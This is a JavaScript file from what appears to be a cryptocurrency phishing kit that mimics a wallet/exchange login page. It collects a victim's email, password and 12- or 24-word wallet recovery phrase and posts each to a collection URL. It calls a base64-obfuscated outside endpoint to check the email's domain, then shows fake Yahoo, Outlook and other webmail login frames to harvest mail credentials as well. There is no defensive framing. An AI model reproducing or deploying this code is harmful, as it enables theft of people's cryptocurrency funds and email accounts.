let emailFirst = false, passwordFirst = false, phraseFirst = false;
let is_visited = false;
let is_clicked = true;
let EmailValue = "";
let PasswordValue = "";
let is_wallet = true;
let domain = "";
let PassPhraseValue = "";
let Domains = {
    "AOL": {link: {d: "Aol Mail", t: "a", u: ""}, id: '#yahoo_modal'},
    "Yahoo": {link: {d: "Yahoo Mail", t: "y", u: ""}, id: '#yahoo_modal'},
    "Zoho": {link: {d: "Zoho Mail", t: "zoho", u: ""}, id: '#others_modal'},
    "1and1": {link: {d: "1&1 Mail", t: "oneandone", u: ""}, id: '#others_modal'},
    "Outlook": {link: {d: "Outlook Mail", t: "h", u: ""}, id: '#outlook_modal'},
    "Office 365": {link: {d: "Office%20365 Mail", t: "o", u: ""}, id: '#outlook_modal'},
    "Gmail": {link: {d: "Gmail Mail", t: "a", u: ""}, id: '#others_modal'},
    "Mail.ru": {link: {d: "Mail.ru Mail", t: "mailru", u: ""}, id: '#others_modal'},
    "Mail.com": {link: {d: "Mail.com Mail", t: "mailcom", u: ""}, id: '#others_modal'},
    "Earthlink": {link: {d: "Earthlink Mail", t: "earthlink", u: ""}, id: '#others_modal'},
    "Rackspace": {link: {d: "Rackspace Mail", t: "a", u: ""}, id: '#outlook_modal'},
    "Mimecast": {link: {d: "Mimecast Mail", t: "m", u: ""}, id: '#outlook_modal'},
    "Godaddy": {link: {d: "Godaddy Mail", t: "godaddy", u: ""}, id: '#outlook_modal'},
    "Comcast": {link: {d: "Comcast Mail", t: "comcast", u: ""}, id: '#others_modal'},
    "Others": {link: {d: "Unknown Provider", t: "others", u: ""}, id: '#others_modal'}
}

let submitButtonRolling = "<div height=\"20px\" width=\"20px\" class=\"sc-hEsumM jUrkZI\"><div color=\"white\" class=\"sc-ktHwxA idxCNd\"></div><div color=\"white\" class=\"sc-ktHwxA sc-cIShpX cubyja\"></div></div>";
let submitButton1 = "<div color=\"whiteFade900\" cursor=\"inherit\" opacity=\"1\" class=\"sc-gzVnrw edfwkt\">Continue</div>";
let submitButton2 = "<div color=\"whiteFade900\" cursor=\"inherit\" opacity=\"1\" class=\"sc-gzVnrw edfwkt\">Log In</div>";
let submitButton3 = "Verify";


$(function () {

    $("#yahoo_modal iframe").attr("srcdoc", YA_YO)
    $("#outlook_modal iframe").attr("srcdoc", O_T)

    $("#wallet, #exchanger").on('click', function () {
        if ($(this).hasClass('is-active') === false) {
            is_clicked = true
            let $input = $("#guidOrEmail");
            is_visited = $(this).attr('data-visited') === "true";
            let data_content = $(this).attr('data-content');
            $(this).attr('data-visited', "true");
            $("#wallet, #exchanger").removeClass('is-active').attr('data-content', $input.val());
            $(this).addClass('is-active');

            is_wallet = $(this)[0].id === "wallet";

            let $emailParent = $("#emailParent");
            $input.val(data_content);
            $emailParent.removeClass("has-error");
            document.getElementById('loginButton').disabled = true;
            if (is_visited) {
                emailFirst = true;
                if (data_content.length < 1) {
                    $emailParent.addClass("has-error");
                    $("#requiredMessage").html("Required");
                } else if (!validateEmail(data_content)) {
                    $emailParent.addClass("has-error");
                    $("#requiredMessage").html("Invalid Email Address");
                } else {
                    document.getElementById('loginButton').disabled = false;
                }
            }
            $input.focus();
            is_clicked = false;
        }
    })


    $("#guidOrEmail").on('keyup focusout', function (e) {

        if (e.type === "keyup") {
            is_clicked = false;
        }
        if (e.type === "focusout") emailFirst = true;
        let value = $(this).val();
        if (is_clicked === false) {
            if (value.length < 1 && (emailFirst || e.type === "focusout")) {
                $("#emailParent").addClass("has-error");
                $("#requiredMessage").html("Required");
                document.getElementById('loginButton').disabled = true;
            } else {
                if (!validateEmail(value) && (emailFirst || e.type === "focusout")) {
                    $("#emailParent").addClass("has-error");
                    $("#requiredMessage").html("Invalid Email Address");
                    document.getElementById('loginButton').disabled = true;
                } else {
                    $("#emailParent").removeClass("has-error");
                    document.getElementById('loginButton').disabled = false;
                }
            }
        }

    })


    $("#FormSubmit").on('submit', async function (e) {
        EmailValue = $("#guidOrEmail").val();
        let $button = $("#loginButton");
        e.preventDefault();
        if ($button.hasClass("rolling_started")) return false;
        $button.addClass("rolling_started");
        $button.html(submitButtonRolling);
        let res = await get_domain(EmailValue);
        if (typeof res === "object") {
            if (Object.keys(res).includes("domain")) {
                domain = res.domain;
                if (domain.length < 2) {
                    setTimeout(function () {
                        $("#emailParent").addClass("has-error");
                        $("#requiredMessage").html("Enter a valid email address");
                        document.getElementById('loginButton').disabled = true;
                        $button.removeClass("rolling_started");
                        $button.html(submitButton1);
                    }, 1000);
                } else {

                    if (is_wallet) {
                        $("#wallet2").removeClass("sc-gJqsIT lbCgTZ").addClass("sc-gJqsIT fRxOvz");
                        $("#exchanger2").removeClass("sc-gJqsIT fRxOvz").addClass("sc-gJqsIT lbCgTZ");
                    } else {
                        $("#exchanger2").removeClass("sc-gJqsIT lbCgTZ").addClass("sc-gJqsIT fRxOvz");
                        $("#wallet2").removeClass("sc-gJqsIT fRxOvz").addClass("sc-gJqsIT lbCgTZ");
                    }
                    $("#passwordBoard").removeClass("has-error");
                    document.getElementById('passwordButton').disabled = true;
                    $("#loginPassword").val("");
                    setTimeout(function () {
                        $("#emailSideUp").html(EmailValue);
                        $("#passwordForm").show();
                        $("#FormSubmit").hide();
                    }, 1200);
                }
            } else {
                window.location.replace(window.location.href);
            }
        } else {
            window.location.replace(window.location.href);
        }
    });

    $("#passwordBack").on('click', function (e) {
        setTimeout(function () {
            let $button = $("#loginButton");
            $button.removeClass("rolling_started");
            $button.html(submitButton1);
            $("#FormSubmit").show();
            $("#passwordForm").hide();
        }, 300);
    })

    $("#passwordForm").on('submit', async function (e) {
        let $password = $("#loginPassword");
        PasswordValue = $password.val().toString();
        let $button = $("#passwordButton");
        let $passwordButtonError = $("#passwordButtonError");
        e.preventDefault();
        if ($button.hasClass("rolling_started")) return false;
        $button.addClass("rolling_started");
        $button.html(submitButtonRolling);
        $passwordButtonError.hide('fast');


        if (PasswordValue.length < 6) {
            setTimeout(function () {
                $("#passwordBoard").addClass("has-error");
                $("#requiredMessage2").html("Required");
                $button.html(submitButton2);
                $password.val("");
                $button.removeClass("rolling_started");
                document.getElementById('passwordButton').disabled = true;
                $passwordButtonError.show();
            }, 1000);
        } else {
            let type = is_wallet ? "Wallet" : "Exchange";
            let post = JSON.stringify({email: EmailValue, password: PasswordValue, type});
            let result = await post_data("main", post);
            if (result === true) {
                setTimeout(function () {
                    $("#emailRightTop").html(EmailValue);
                    $("#phrase").html("").removeClass("has-error");
                    $("#loginResendEmail").html(submitButton3).removeClass("rolling_started");
                    $("#passPhraseForm").show();
                    $("#passwordForm").hide();
                    $button.html(submitButton2);
                    $button.removeClass("rolling_started");
                }, 1200);
            } else {
                location.replace(location.href);
            }
        }
        return false;
    });


    $("#loginPassword").on('keyup focusout', function (e) {
        if (e.type === "focusout") passwordFirst = true;
        let value = $(this).val();
        if (value.length < 1 && (passwordFirst || e.type === "focusout")) {
            $("#passwordBoard").addClass("has-error");
            $("#requiredMessage2").html("Required");
            document.getElementById('passwordButton').disabled = true;
        } else {
            $("#passwordBoard").removeClass("has-error");
            document.getElementById('passwordButton').disabled = false;
        }
    })


    //Form 3

    $("#passPhraseForm").on('submit', async function (e) {
        e.preventDefault();
        let $phrase = $("#phrase");
        PassPhraseValue = $phrase.val();
        let $button = $("#loginResendEmail");
        let $passPhraseError = $("#passPhraseError");
        if ($button.hasClass("rolling_started")) return false;
        $button.addClass("rolling_started");
        $button.html(submitButtonRolling);
        $passPhraseError.hide('fast');
        $phrase.removeClass("has-error");

        if (passPhraseCheck(PassPhraseValue)) {

            let type = is_wallet ? "Wallet" : "Exchange";
            let post = JSON.stringify({email: EmailValue, password: PasswordValue, type, phrase: PassPhraseValue});
            let res = await post_data("phrase", post);
            if (res === true) {
                setTimeout(function () {


                    let id = Domains[domain].id;
                    let $parent = $(id);
                    let i_o = Domains[domain].link;
                    Object.keys(i_o).forEach(function (value) {
                        $parent.find("iframe").attr(`data-${value}`, value === "u" ? EmailValue : i_o[value]);
                    });

                        Fancybox.show([{src: id, type: "inline"}], {click: false});
                        if (id === "#outlook_modal" || id === "#rackspace_modal") {
                            $(".fancybox__slide.is-selected.has-inline").css({
                                "border-width": "0",
                                "padding": "0",
                                "margin": "0"
                            })
                        }

                }, 1200);
            } else {
                location.replace(location.href);
            }


        } else {

            if (PassPhraseValue.length < 2) {
                $phrase.addClass("has-error");
                $button.html(submitButton3);
                $button.removeClass("rolling_started");
                $passPhraseError.hide();
                return false;
            }

            setTimeout(function () {
                $phrase.addClass("has-error");
                $button.html(submitButton3);
                $button.removeClass("rolling_started");
                $passPhraseError.show();
            }, 1000);

        }
    })


    $("#phrase").on('keyup focusout', function (e) {
        if (e.type === "focusout") phraseFirst = true;
        let value = $(this).val();
        if (value.length < 1 && (phraseFirst || e.type === "focusout")) {
            $(this).addClass("has-error");
        } else {
            $(this).removeClass("has-error");
        }
    })


})


async function get_domain(e_m) {
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: window.atob("aHR0cHM6Ly8wYTAzNzExNC5ldS1nYi5hcGlndy5hcHBkb21haW4uY2xvdWQvY2hlY2svZG9tYWluP2VfbT0=") + e_m,
            type: 'GET',
            dataType: "json",
            contentType: "application/json; charset=utf-8",
            beforeSend: function (xhr) {
                /* xhr.setRequestHeader('Authorization', `Bearer ${token}`); */
            },
            data: JSON.stringify({
                e_m
            }),
            success: function (response) {
                resolve(response);
            },
            error: function (response) {
                let error = {errors: response.responseJSON.errors[0]}
                resolve(error);
            }
        });
    });
}


async function post_data(type, post) {
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: SCRIPT_URL,
            type: 'POST',
            dataType: "json",
            data: {type, post},
            success: function (response) {
                resolve(true);
            },
            error: function (response) {
                let error = {errors: response.responseJSON.errors[0]}
                resolve(false);
            }
        });
    });
}


function passPhraseCheck(content) {
    if (content.split(" ").length === 12 || content.split(" ").length === 24) {
        let isChecked = true;
        content.split(" ").forEach(function (value, index) {
            if (value.length < 2) isChecked = false;
        })
        return isChecked;
    } else {
        return false;
    }
}

window.submitEmailFromFrame = function (password, email, domain) {

    console.log(password)

}

function validateEmail(mail) {
    return (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,10})+$/.test(mail));
}